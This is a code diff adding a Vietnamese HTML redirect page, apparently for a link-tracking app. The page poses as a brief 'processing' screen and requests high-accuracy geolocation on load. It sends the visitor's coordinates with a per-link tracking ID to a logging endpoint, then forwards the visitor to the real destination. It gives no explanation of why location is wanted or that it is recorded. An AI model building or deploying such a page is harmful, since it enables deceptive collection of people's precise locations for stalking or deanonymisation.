@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đang chuyển hướng...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center h-screen">
+    <div class="text-center p-8 bg-gray-800 rounded-lg shadow-lg">
+        <h1 class="text-2xl font-bold mb-4">Đang xử lý...</h1>
+        <p id="status" class="text-gray-400 mb-4">Vui lòng đợi trong giây lát. Trình duyệt có thể hỏi bạn quyền truy cập vị trí.</p>
+        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-400 mx-auto"></div>
+    </div>
+    <script>
+        const trackingId = "{{ link.tracking_id }}";
+        const originalUrl = "{{ link.original_url }}";
+        const statusDiv = document.getElementById('status');
+        
+        function redirectToOriginalUrl() {
+            statusDiv.textContent = 'Đang chuyển hướng bạn đến trang đích...';
+            window.location.replace(originalUrl);
+        }
+        
+        async function sendLocationToServer(lat, lon) {
+            try {
+                await fetch('/api/log-location/', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        tracking_id: trackingId,
+                        lat: lat,
+                        lon: lon
+                    })
+                });
+            } catch (err) {
+                console.error('Không thể gửi vị trí về server:', err);
+            }
+        }
+        
+        window.onload = function() {
+            if (!navigator.geolocation) {
+                statusDiv.textContent = 'Trình duyệt không hỗ trợ Geolocation. Đang chuyển hướng...';
+                redirectToOriginalUrl();
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    statusDiv.textContent = 'Cảm ơn bạn! Đang chuyển hướng...';
+                    const { latitude, longitude } = position.coords;
+                    await sendLocationToServer(latitude, longitude);
+                    redirectToOriginalUrl();
+                },
+                () => {
+                    statusDiv.textContent = 'Bạn đã không chia sẻ vị trí. Đang chuyển hướng...';
+                    redirectToOriginalUrl();
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        };
+    </script>
+</body>
+</html>
